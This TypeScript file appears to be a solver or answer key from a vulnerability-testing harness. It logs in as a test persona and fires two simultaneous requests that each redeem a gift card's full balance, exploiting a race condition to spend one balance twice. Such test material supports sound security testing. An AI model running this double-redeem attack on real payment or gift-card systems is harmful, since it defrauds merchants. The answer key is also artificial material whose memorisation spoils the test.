// Redeem the same gift card twice concurrently so both redemptions clear against one balance.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface GiftCard { external_id: string; balance: number }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const res = await ctx.fetch(buildPath(ctx.plan, 'listGiftCards'), { method: 'GET' })
  const data = (await res.json().catch(() => ({}))) as { giftCards?: GiftCard[] }
  const card = data.giftCards?.[0]
  if (!card) return
  const amountField = ctx.plan.params['bodyAmount'] ?? 'bodyAmount'
  const path = buildPath(ctx.plan, 'redeemGiftCard', { giftCardId: card.external_id })
  const redeem = (): Promise<Response> =>
    ctx.fetch(path, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ [amountField]: card.balance }),
    })
  await Promise.all([redeem(), redeem()])
}
